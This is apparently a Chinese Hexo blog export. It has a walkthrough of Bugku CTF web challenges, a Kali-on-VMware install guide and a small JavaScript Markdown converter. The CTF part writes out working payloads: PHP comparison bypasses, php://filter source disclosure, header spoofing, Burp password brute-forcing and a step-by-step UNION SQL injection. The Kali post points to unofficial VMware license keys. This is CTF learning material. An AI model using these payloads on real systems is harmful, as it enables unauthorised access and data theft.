<p>而==只比较他们的值）。分析代码，要想进入if代码里面需要满足给num的值不是数字，但进入里面需要num为1.有没有很困惑？不慌。其实因为num变量是与1比较，在比较的时候会默认把num转化为数字型。于是我们构造payload来绕过：<a href="http://123.206.87.240:8002/get/index1.php?num=1a">http://123.206.87.240:8002/get/index1.php?num=1a</a><br>只要在1后面加上任意非数字字符就能绕过。</p>
<p>参考链接：<a href="https://www.jianshu.com/p/ec7ef77b67a2">https://www.jianshu.com/p/ec7ef77b67a2</a></p>
<div align = "center"><img src="https://i.loli.net/2019/09/03/ywOYiHjtbFLeA5z.png" width="300" hegiht="100" ></div>

<h2 id="6-web3"><a href="#6-web3" class="headerlink" title="6.web3"></a>6.<a href="http://123.206.87.240:8002/web3/">web3</a></h2><p>点击阻止创建对话框，右击查看网页源代码，在最后发现</p>
<pre><code>&lt;!&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;--&gt;
</code></pre>
<p>查找在线解码工具<a href="http://tool.chinaz.com/Tools/urlencode.aspx">http://tool.chinaz.com/Tools/urlencode.aspx</a><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMDkvMDQvVENHN1ZJbWJQaXpKRlVZLnBuZw?x-oss-process=image/format,png" alt="TIM截图20190904131925.png"></p>
<h2 id="7-域名解析"><a href="#7-域名解析" class="headerlink" title="7.域名解析"></a>7.域名解析</h2><p>题目：<div align = "center"><img src="https://img-blog.csdnimg.cn/20190904134919577.png"  width="400" hegiht="113"></div><br>这题需要改变hosts文件（C:\Windows\System32\drivers\etc），</p>
<div align = "center"><img src="https://img-blog.csdnimg.cn/20190904134945198.png"  width="400" hegiht="113"></div>
访问flag.baidu.com得到flag
<div align = "center"><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMDkvMDQvaEVIZjFWQXpXd0RyS3k2LnBuZw?x-oss-process=image/format,png"  width="400" hegiht="113"></div>


<h2 id="8-你必须让他停下"><a href="#8-你必须让他停下" class="headerlink" title="8.你必须让他停下"></a>8.<a href="http://123.206.87.240:8002/web12/">你必须让他停下</a></h2><p>打开链接，发现有好多张图片一直在动，要看到每页的源码显然是不可能的，这个时候就需要burp suite进行抓包，我也是第一次使用此工具。参考链接:<a href="https://t0data.gitbooks.io/burpsuite/content/chapter2.html">https://t0data.gitbooks.io/burpsuite/content/chapter2.html</a>，在火狐浏览器里面配置好代理，看到页面，可知配置成功。</p>
<div align = "center"><img src="https://img-blog.csdnimg.cn/20190904203547806.png"  width="400" hegiht="113"></div>
打开Burp Suite软件 — 点击Proxy — 点击Action(选择send to repeater ) — 点击repeater — 一直点击go，知道在Response页面的Raw选项出现如下内容，即为成功。
<div align = "center"><img src="https://img-blog.csdnimg.cn/20190904204046516.png"  width="400" hegiht="113"></div>

<h2 id="9-本地包含"><a href="#9-本地包含" class="headerlink" title="9.本地包含"></a>9.<a href="http://123.206.87.240:8003/">本地包含</a></h2><p>先了解一下$_REQUEST：<a href="https://www.php.net/manual/zh/reserved.variables.request.php">https://www.php.net/manual/zh/reserved.variables.request.php</a><br>由于本题已挂，所以只介绍一下做题方法：<a href="https://blog.csdn.net/dyw_666666/article/details/82389457#comments">https://blog.csdn.net/dyw_666666/article/details/82389457#comments</a></p>
<h2 id="10-变量1"><a href="#10-变量1" class="headerlink" title="10.变量1"></a>10.<a href="http://123.206.87.240:8004/index1.php">变量1</a></h2><p>PHP中全局变量global和$GLOBALS[]的区别分析:</p>
<p> ==global $var其实就是&amp;$GLOBALS[‘var’]，调用外部变量的一个别名而已。PHP的全局变量和C语言有一点点不同。在C语言中，全局变量在函数中主动生效，除非被局部变量笼罩。这可能引起一些问题，有些人可能漫不经心的转变一个全局变量。PHP中全局变量在函数中应用时必须用global申明为全局。PHP的Global变量的作用是定义全局变量，但是这个全局变量不是应用于整个网站，而是应用于当前页面，包括include或require的所有文件。==</p>
<p>知只要运行 eval(“var_dump($$args);”)，就能得到flag.这是需要构造一个GET参数，</p>
<div align = "center"><img src="https://img-blog.csdnimg.cn/2019090612075548.png"  width="700" hegiht="113"></div>
所以，只需给变量传一个全局数组变量即可，构造get参数：

<p><a href="http://123.206.87.240:8004/index1.php?args=GLOBALS">http://123.206.87.240:8004/index1.php?args=GLOBALS</a></p>
<p>即可得到flag：</p>
<div align = "center"><img src="https://img-blog.csdnimg.cn/2019090612103610.png"  width="500" hegiht="113"></div>

<h2 id="11-web5"><a href="#11-web5" class="headerlink" title="11. web5"></a>11. <a href="http://123.206.87.240:8002/web5/">web5</a></h2><p>看到这种问题，第一反应就是查看网页源代码：结果发现好多的”(+[]”这种符号，不要慌，这其实就是题中说的<a href="https://github.com/aemkei/jsfuck">JSPFUCK</a>,其实这是一串js代码，可以放在控制台去执行。复制源码中的所有这些代码，然后去控制台粘贴，回车</p>
<div align = "center"><img src="https://img-blog.csdnimg.cn/20190906123158712.png"  width="200" hegiht="113"></div>
你以为这就完了？？？？别忘了，是要大写的。

<p>所以答案是:  $\color{red}{CTF{WHATFK}}$</p>
<h2 id="12-头等舱"><a href="#12-头等舱" class="headerlink" title="12.头等舱"></a>12.<a href="http://123.206.87.240:9009/hd.php">头等舱</a></h2><p>说实话，刚点开链接，看见页面显示“什么都没有”，想着真棒，又有一道题挂了，哈哈哈哈哈哈！两巴掌抽死我自己吧！做什么白日梦。<br>解决方法：打开源码，也什么提示都没有。所以可以想到试试抓包，推荐一个新工具 — <a href="https://www.cnblogs.com/zhangtan/p/8625232.html">fiddler</a>,此超链接里面有详细使用方法。发现flag在响应头里面。</p>
<div align = "center"><img src="https://img-blog.csdnimg.cn/20190906142150153.png"></div>

<h2 id="13-网站被黑"><a href="#13-网站被黑" class="headerlink" title="13.网站被黑"></a>13.<a href="http://123.206.87.240:8002/webshell/">网站被黑</a></h2><p>题中提示实战中经常遇到，那就试一下开御剑扫描后台吧！扫描后发现有两个</p>
<div align = "center"><img src="https://img-blog.csdnimg.cn/20190906153355548.png"></div>
选择第二个，使用万能钥匙“admin'-”等弱密码试登录，发现无果。接着开burp进行爆破。分别进行如下操作：点击intruder — payloads。
<div align = "center"><img src="https://img-blog.csdnimg.cn/20190906160103943.png"></div>
第一步选择Simple list ,第二步选择burp自带字典Passwords（我的burp软件没有自带的字典）或者导入本地字典（推荐剑眉大侠爆破专用字典）。
点击start attack，接下来就是漫长的等待。
<div align = "center"><img src="https://img-blog.csdnimg.cn/20190906164401897.png"></div>
用结果hack登录，成功得到flag。
<div align = "center"><img src="https://img-blog.csdnimg.cn/20190906161010532.png"></div>

<h2 id="14-管理员系统"><a href="#14-管理员系统" class="headerlink" title="14.管理员系统"></a>14.<a href="http://123.206.31.85:1003/">管理员系统</a></h2><ol>
<li>先随便输入username 和password提交发现显示：“IP禁止访问，请联系本地管理员登陆，IP已被记录”</li>
<li>检查元素发现base64编码$\color{green}{<!--dGVzdDEyMw==-->}$ 尝试解码，发现密码为test123，管理员登陆username应该为admin,尝试登陆，未果。</li>
<li>返回最本质的提示：IP禁止访问，请联系本地管理员登陆，IP已被记录<br>得到思路：可以伪装成本地访问(想到HTTP请求头中的<a href="https://baike.baidu.com/item/X-Forwarded-For/3593639?fr=aladdin">X-Forwarded-For</a>)</li>
<li> <strong>方法一：</strong> </li>
</ol>
<pre><code>直接在火狐浏览器里面按F12 — 网络 — 所有 — 刷新页面 — 出现
</code></pre>
<div align = "center"><img src="https://img-blog.csdnimg.cn/20190908152215487.png" width="450" hegiht="113"></div>
  
<pre><code>点击它，右边出现消息头，点击里面状态码（编辑和重发）
</code></pre>
<div align = "center"><img src="https://img-blog.csdnimg.cn/20190908155801418.png" width="450" hegiht="113"></div>
    
<pre><code>点击发送，出现新的POST，再次点击，查看响应，出现
</code></pre>
<div align = "center"><img src="https://img-blog.csdnimg.cn/20190908152647209.png" width="450" hegiht="113"></div>

<pre><code>记得格式，所以flag为flag&#123;85ff2ee4171396724bae20c0bd851f6b&#125;
</code></pre>
<p>   <strong>方法二：</strong> </p>
<pre><code>在burp里面抓包，然后发送到repeater,在repeater中的headers里添加x-forwarded-for，点击GO，在右面response的raw中出现
</code></pre>
<div align = "center"><img src="https://img-blog.csdnimg.cn/2019090815414286.png" width="450" hegiht="113"></div>  
   
<p>   <em><em>注：其实上面的方法原理是一样的，但第一种显然更简单</em>.务必按照顺序进行</em></p>
<h2 id="15-web4"><a href="#15-web4" class="headerlink" title="15.web4"></a>15.<a href="http://123.206.87.240:8002/web4/">web4</a></h2><p>   在控制台运行源代码中（将eval改为alert）<br>   <div align = "center"><img src="https://img-blog.csdnimg.cn/20190908161509796.png" width="450" hegiht="113"></div><br>   页面弹出<br>    <div align = "center"><img src="https://img-blog.csdnimg.cn/20190908161425278.png" width="550" hegiht="113"></div><br>    这段js代码里面的if条件里面有一个字符串，不用想太多，直接把他在表单里面提交，然后就看到了flag<br>    <div align = "center"><img src="https://img-blog.csdnimg.cn/20190908162411957.png" width="300" hegiht="113"></div></p>
<h2 id="16-flag在index里"><a href="#16-flag在index里" class="headerlink" title="16.flag在index里"></a>16.<a href="http://123.206.87.240:8005/post/">flag在index里</a></h2><p> 点击页面出现的连接，发现网址<a href="http://123.206.87.240:8005/post/index.php?file=show.php">http://123.206.87.240:8005/post/index.php?file=show.php</a>,file=show.php可以想到上传文件文件漏洞，如若访问index.php就能找到flag？不要犹豫，想到就去试。但是如何访问呢？在PHP里面独有个协议：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">php://filter</a>, 用php://filter/read=convert.base64-<br>encode/resource=index.php（即以base64加密的方式读取resource的内容）来替换show.php，出现</p>
<pre><code>PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg== 
</code></pre>
<p> 将其进行解码，得到flag，（大胆放开思维，打好基础）<br> <div align = "center"><img src="https://img-blog.csdnimg.cn/20190908174351676.png" width="500" hegiht="113"></div></p>
<h2 id="17-输入密码查看flag"><a href="#17-输入密码查看flag" class="headerlink" title="17.输入密码查看flag"></a>17.<a href="http://123.206.87.240:8002/baopo/">输入密码查看flag</a></h2><p> 这题挺简单的，5位数直接在burp里面爆破就行。但是这回在inruder中的payloads里面payload type选择numbers,然后下面的数字范围选择从10000 - 99999，如下图所示。<br>  <div align = "center"><img src="https://img-blog.csdnimg.cn/20190908180345607.png" width="350" hegiht="113"></div><br>  <div align = "center"><img src="https://img-blog.csdnimg.cn/20190908180532444.png" width="350" hegiht="113"></div><br>  但是这里有一个问题，就是我直接这样点击attack它会出现错误，提示：No payload positions defined.<br>  查了好长时间，终于找到了解决方法     </p>
<p><a href="https://blog.csdn.net/Langtuteng17/article/details/80450354">https://blog.csdn.net/Langtuteng17/article/details/80450354</a>，按照步骤最终得到flag</p>
<div align = "center"><img src="https://img-blog.csdnimg.cn/20190908195436460.png" width="350" hegiht="113"></div>

<h2 id="18-点击一百万次"><a href="#18-点击一百万次" class="headerlink" title="18.点击一百万次"></a>18.<a href="http://123.206.87.240:9001/test/">点击一百万次</a></h2><ul>
<li>查看源代码，发现js代码里面，if条件当clicks&gt;=1000000，会提交。</li>
<li>F12查看元素，试着改span中间次数，未果。</li>
<li>直接改变POST方法，在hackbar里面直接将clicks&gt;=1000000,直接得到flag。<div align = "center"><img src="https://img-blog.csdnimg.cn/20190908211450638.png" width="400" hegiht="113"></div>
<div align = "center"><img src="https://img-blog.csdnimg.cn/20190908211509358.png" width="400" hegiht="113"></div></li>
</ul>
<h2 id="19-备份是个好习惯"><a href="#19-备份是个好习惯" class="headerlink" title="19 .备份是个好习惯"></a><del><font color="purple" size="5">19</del> .<a href="http://123.206.87.240:8002/web16/">备份是个好习惯</a></font></h2><pre><code>看到一串字符串（字符串前后重复），直接想到的就是解码，但是试了几乎所有的，毫无意外以失败告终。
用御剑扫描尝试，还是没有结果。（我搜了网上的答案，好多都是用御剑扫出来的，我的也不知道是咋回事）
</code></pre>
<p>想到题目提示备份，默认访问的是地址的index.php文件，备份文件的后缀.一般都是这几种：rar   .zip   .7z   .tar.gz    .bak    .swp   .txt   .html，经过多次尝试，发现当地址被构造成 <a href="http://123.206.87.240:8002/web16/index.php.bak">http://123.206.87.240:8002/web16/index.php.bak</a> 的时候会得到一个文件。<br>分析里面的PHP代码可得出结论：要想得到flag，就要使得key1不等于key2，但是他两的MD5只要相等。然后怎样绕过这个，还是参考一下大佬的答案吧！写的很是详细。<br>大佬答案：<a href="http://www.manongjc.com/article/107754.html">http://www.manongjc.com/article/107754.html</a></p>
<h2 id="20-成绩单"><a href="#20-成绩单" class="headerlink" title="20.成绩单"></a>20.<a href="http://123.206.87.240:8002/chengjidan/">成绩单</a></h2><p><strong>Notice</strong>：</p>
<ul>
<li>TABLE_SCHEMA=后面是库名的16进制（<a href="http://www.5ixuexiwang.com/str/hex.php">在线工具转16进制</a>）莫忘记加上* 0× *</li>
<li>MySQL数据库特有的表是 —— information_schema.tables，access数据库特有的表是 —— msysobjects，SQLSever数据库特有的表是 —— syobjects</li>
<li>union 联合查询适用于有显示列的注入</li>
<li>具体sql注入问题，请访问  <a href="https://mp.weixin.qq.com/s/xJVOW5Z4xvl0COSZBWKFYw">https://mp.weixin.qq.com/s/xJVOW5Z4xvl0COSZBWKFYw</a>，十分详细的教程</li>
</ul>
<p><strong>准备好sql注入：</strong></p>
<ol>
<li>获取字段数 ：由表中可知，字段数大于等于3，所以 1’ order by 4# —— 有回显； 1’ order by 5# —— 没有回显。可以确定字段数为4</li>
<li>获取数据库名：-1’ union select 1,2,3,database()#  发现表中显示skctf_flag，猜想这就是数据库名</li>
<li>获取skctf_flag库名下的所有表名信息：-1’ union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#  发现表中显示(fl4g,sc)，很显然fl4g是所要爆破的表名</li>
<li>获取fl4g表名下的列名信息： -1’ union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x666c3467#  发现表中显示skctf_flag，则这就是要获取的列名</li>
<li>获取指定列名skctf_flag里面的数据，-1’ union select 1,2,3,skctf_flag from fl4g#  最后得到flag<div align = "center"><img src="https://img-blog.csdnimg.cn/20190920165240595.png" width="450" hegiht="113"></div></li>
</ol>
]]></content>
      <categories>
        <category>WP</category>
      </categories>
      <tags>
        <tag>bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>安装kali</title>
    <url>/2019/11/19/postName/</url>
    <content><![CDATA[<h2 id="用虚拟机安装Kali系统"><a href="#用虚拟机安装Kali系统" class="headerlink" title="用虚拟机安装Kali系统"></a>用虚拟机安装Kali系统</h2><p>(要安装这个虚拟机，电脑性能要过关，起码内存得大于4G，不然会卡到运行不了任何东西,闪退，死机是常有的事。)</p>
<p>这主要分为以下三个步骤：</p>
<h5 id="一-安装VMware虚拟机（官网下载）"><a href="#一-安装VMware虚拟机（官网下载）" class="headerlink" title="一.安装VMware虚拟机（官网下载）"></a>一.安装VMware虚拟机（官网下载）</h5><p>&nbsp;&nbsp;<font size=4 color='red'>注意:</font></p>
<h6 id="1-在安装过程中需要输入秘钥-给的网址操作中的秘钥用不了，在此推荐几个方法亲试有效：-当然还是建议大家自己买的"><a href="#1-在安装过程中需要输入秘钥-给的网址操作中的秘钥用不了，在此推荐几个方法亲试有效：-当然还是建议大家自己买的" class="headerlink" title="1.在安装过程中需要输入秘钥,给的网址操作中的秘钥用不了，在此推荐几个方法亲试有效：(当然还是建议大家自己买的)"></a>1.在安装过程中需要输入秘钥,给的网址操作中的秘钥用不了，在此推荐几个方法亲试有效：(当然还是建议大家自己买的)</h6><pre><code>  1.https://www.cnblogs.com/vhhi/p/10202204.html，里面有一些免费的秘钥 ，但一定要看好版本；
  2.链接：https://pan.baidu.com/s/1yvPkmLVMzYfhtayqj7YE-g 提取码：qyxj （下载的软件会自动生成秘钥，但是需要一个一个试，比较麻烦。不过，成功的话还是很有成就感的。）
</code></pre>
<span id="more"></span>

<h6 id="2-电脑本身可能会被禁用VMware虚拟机，这个真的是让人头秃，不过，总是会有办法的。"><a href="#2-电脑本身可能会被禁用VMware虚拟机，这个真的是让人头秃，不过，总是会有办法的。" class="headerlink" title="2.电脑本身可能会被禁用VMware虚拟机，这个真的是让人头秃，不过，总是会有办法的。"></a>2.电脑本身可能会被禁用VMware虚拟机，这个真的是让人头秃，不过，总是会有办法的。</h6><pre><code>提供一个链接：https://zhidao.baidu.com/question/374340852330543564.htmlword=vm%E8%99%9A%E6%8B%9F%E6%9C%BAinter%20vt-x&amp;ms=1&amp;rid=8282772747998700377
</code></pre>
<p>他这个资料里面说如果是4G的内存就分2G给虚拟机，这个并不可取，虽然是4G，但是实际上的内存会小于4G，也就是说你若分了2G给虚拟机，那么你的主机几乎就是歇菜的。</p>
<p>这个里面也还是有一些不同的，每个电脑进入bios的方法不同，我的是联想，当时在外面无论是按F1、F2、还是F1+Fn等等，都没有用，最后还是在里面进的，所以最好查查自己电脑的进入BIOS的方式，最后提醒一下，下图中BIOS中的设置顺序是不同的，需要耐心查找。<br><img src="https://img-blog.csdnimg.cn/20190407004823233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzcyODYy,size_5,color_FFFFFF,t_20" alt="在这里插入图片描述"></p>
<h6 id="3-进入VMware的时候会让输入用户名和密码"><a href="#3-进入VMware的时候会让输入用户名和密码" class="headerlink" title="3.进入VMware的时候会让输入用户名和密码"></a>3.进入VMware的时候会让输入用户名和密码</h6><pre><code>linux初始的用户名是root，密码就是安装系统时的密码；如果当初安装系统的时候没有设置密码，那么密码为toor;也可以在终端sudo passwd root，然后进去重置密码就行。
</code></pre>
<h5 id="二-下载Kali-Linux系统安装包"><a href="#二-下载Kali-Linux系统安装包" class="headerlink" title="二.下载Kali Linux系统安装包"></a>二.下载Kali Linux系统安装包</h5><pre><code>这个直接在官网下载就好了
</code></pre>
<h5 id="三-进行安装"><a href="#三-进行安装" class="headerlink" title="三.进行安装"></a>三.进行安装</h5><p>具体操作：<a href="https://jingyan.baidu.com/article/9faa7231b1ffb9473d28cb7e.html">https://jingyan.baidu.com/article/9faa7231b1ffb9473d28cb7e.html</a><br> (这一部分耗时较长，可以玩点其他的东西)</p>
<p>对了，再说一下进入Kali后如何安装VMware Tools吧！<br>参考链接：<a href="https://blog.csdn.net/qq_39536876/article/details/79501471">https://blog.csdn.net/qq_39536876/article/details/79501471</a><br><img src="https://img-blog.csdnimg.cn/20190407010932789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzcyODYy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在上图所示部分可能会出现一点小错误，记得将输入改为“sudo ./ vmware-install.pl”就好了。</p>
<p><font color='orange'>以上的所有问题均为我在安装时候出现的bug，如果你遇到了什么解决不了的问题，欢迎在下方留言，我一定帮你找到解决方法。为了防止入坑，关注我吧，我会实时更新博客，让你可以和我这个信息安全方面的小白共同进步。</font></p>
<hr>
<p>网站：i春秋，黑白之道，绿盟，freebuf,<br>刷题平台：ctf编码，geek学习吧，bugku,实验吧，<br>渗透式导航：<a href="https://www.shentoushi.top/">https://www.shentoushi.top/</a></p>
<hr>
<blockquote>
<blockquote>
<blockquote>
<blockquote>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/20190407011756813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzcyODYy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>简单的makedown编译器</title>
    <url>/2019/11/19/%E7%AE%80%E5%8D%95%E7%9A%84makedown%E7%BC%96%E8%AF%91%E5%99%A8/</url>
    <content><![CDATA[<h2 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h2><hr>
<p> 学习正则表达式、文件 IO 等相关内容，编写简易的 Markdown 解析器</p>
<hr>
<h2 id="具体要求："><a href="#具体要求：" class="headerlink" title="具体要求："></a>具体要求：</h2><hr>
<p>编写程序，解析文件，将 Markdown 格式的图片和超链接转换成 HTML 格式。</p>
<p>首先，你需要使用正则表达式在文件中筛选定位到 Markdown 格式的图片和超链接。</p>
<p>然后，将图片和超链接的路径获取出来并转换为 HTML 格式。</p>
<p>转换完成之后，生成新的 HTML 文件，双击打开该 HTML 文件后，图片和超链接均可以在网页上得到显示</p>
<hr>
<span id="more"></span>
<h2 id="效果图："><a href="#效果图：" class="headerlink" title="效果图："></a><em>效果图</em>：</h2><p><em><strong>动态操作</strong></em><br><img src="https://img-blog.csdnimg.cn/20190224110259690.gif" alt="在这里插动图入图片描述"></p>
<p><em><strong>新生成的HTML文件效果图</strong></em><br><img src="https://img-blog.csdnimg.cn/20190224110349171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzcyODYy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p>1.<a href="https://www.cnblogs.com/hhhyaaon/p/5929492.html%EF%BC%9B">https://www.cnblogs.com/hhhyaaon/p/5929492.html；</a><br>                 2. <a href="http://www.zhangxinxu.com/wordpress/2017/07/js-text-string-download-as-html-json-file/">http://www.zhangxinxu.com/wordpress/2017/07/js-text-string-download-as-html-json-file/</a>;<br>                   3.<a href="https://taoyouyou.gitee.io/">https://taoyouyou.gitee.io/</a>;</p>
<h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p> 1.读取所选文件的内容<br>     <em><strong><strong>注意</strong></strong></em>： 务必在HTML部分添加input标签类型设置为type=“file” ；</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> file = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;file&#x27;</span>).files[<span class="number">0</span>];  <span class="comment">//选择一个文件</span></span><br><span class="line">           oBtn1.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">               <span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();     <span class="comment">////读取本地文件，以utf-8编码方式输出</span></span><br><span class="line">               reader.readAsText(file,<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">               reader.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;     <span class="comment">// onload 回调函数是在异步请求加载完成后所执行的函数</span></span><br><span class="line">                   <span class="keyword">var</span> fileContent = reader.result;   <span class="comment">//为读取到的内容附一个变量</span></span><br><span class="line">                   getFile.innerHTML = fileContent;</span><br></pre></td></tr></table></figure>

<p> 2.使用正则表达式在文件中筛选定位到 Markdown 格式的图片和超链接，创建新的元素，并使用HTML5中的blob生成URL 地址.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> imgLink = <span class="regexp">/!(\[.*\])\((.*)\)/gi</span>;    <span class="comment">//markdown中图片对应的正则表达式</span></span><br><span class="line"><span class="keyword">var</span> hyperLink = <span class="regexp">/\[(.*)\]\((.*)\)/gi</span>;   <span class="comment">//markdown中超链接对应的正则表达式</span></span><br><span class="line">fileContent = fileContent.replace(imgLink, <span class="string">&quot;&lt;img src=&#x27;$2&#x27; alt=&#x27;picture&#x27;&gt;&quot;</span>);     <span class="comment">//替换符合正则表达式的内容      </span></span><br><span class="line">fileContent = fileContent.replace(hyperLink, <span class="string">&quot;&lt;h2&gt;&lt;a herf =&#x27;$2&#x27; target = &#x27;_blank&#x27;&gt;$1&lt;/a&gt;&lt;/h2&gt;&quot;</span>);</span><br><span class="line">aftChange.innerHTML = fileContent;</span><br><span class="line"><span class="comment">// 下载文件方法, 借助HTML5 Blob实现文本信息文件下载</span></span><br><span class="line"><span class="built_in">console</span>.log(fileContent)</span><br><span class="line"><span class="keyword">var</span> funDownload = <span class="function"><span class="keyword">function</span> (<span class="params">content, filename</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> eleLink = <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    eleLink.download = filename;</span><br><span class="line">    eleLink.style.display = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">    <span class="comment">// 字符内容转变成blob地址</span></span><br><span class="line">    <span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([content]);</span><br><span class="line">    eleLink.href = URL.createObjectURL(blob);</span><br><span class="line">    <span class="comment">// 触发点击</span></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(eleLink);</span><br><span class="line">    eleLink.click();</span><br><span class="line">    <span class="comment">// 然后移除</span></span><br><span class="line">    <span class="built_in">document</span>.body.removeChild(eleLink);</span><br><span class="line">&#125;;<span class="string">`</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>下载生成的test.md文件`</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;download&#x27;</span> <span class="keyword">in</span> <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="comment">// 作为test.html文件下载</span></span><br><span class="line">                            oBtn3.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                                alert(fileContent);</span><br><span class="line">                                funDownload(fileContent, <span class="string">&#x27;test.html&#x27;</span>);</span><br><span class="line">                            &#125;);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            oBtn3.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                                alert(<span class="string">&#x27;浏览器不支持&#x27;</span>);</span><br><span class="line">                            &#125;;</span><br><span class="line">                        &#125;<span class="string">`</span></span><br></pre></td></tr></table></figure>

<h2 id="完整代码："><a href="#完整代码：" class="headerlink" title="完整代码："></a><em><strong>完整代码</strong></em>：</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>markdown!!!!!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.position</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="css">            <span class="attribute">width</span>: <span class="number">350px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">height</span>: <span class="number">500px</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-id">#left</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-top</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-left</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-id">#center</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-left</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-top</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-id">#right</span> &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-left</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">margin-top</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css"></span></span><br><span class="line"><span class="css">        pre &#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">color</span>: blue;</span></span><br><span class="line"><span class="css">            <span 